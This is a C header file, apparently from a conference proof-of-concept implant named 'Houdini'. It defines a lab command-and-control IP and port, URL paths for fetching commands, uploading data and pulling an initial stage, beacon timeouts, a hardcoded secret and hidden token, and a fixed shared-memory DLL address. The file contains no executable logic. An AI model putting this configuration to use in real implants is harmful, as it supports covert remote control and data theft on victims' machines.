#ifndef _HOUDINI_DEFINITIONS_H
#define _HOUDINI_DEFINITIONS_H

#define DLL_QUERY_HMODULE		6
#define DLL_QUERY_HANDLE		7
#define DLL_SET_INSTANCE		8

#define secret "t0pSecr3t!"
// This token should only be lying in the DLL but is currently not used anywhere in the program flow, so shouldn't appear in any heap stack but only in the hidden share memory
#define hidden_token "BLACKHAT_USA_2020_what.the.eyes.see.and.the.ears.hear..the.mind.believes_BLACKHAT_USA_2020"
#define cnc_ip L"192.168.56.1"
#define cnc_port 8000
// Only used for the C&C communication to separate command from payload
#define command_seperator "_houdini_"
#define get_cmd_path L"/giVe_something_todo"
#define upload_path L"/got_somEthing_for_you"
#define initial_stage_path L"/initial_sTage"
#define reveal_command_timeout 60000
#define loop_sleep_timeout 30000
#define max_server_resp_size 1000000

// TODO don't depend on static address in future release
#define shared_dll_base (LPVOID)0x612345670000

// Uncomment to enable debugging output
//#define _DEBUG

#endif
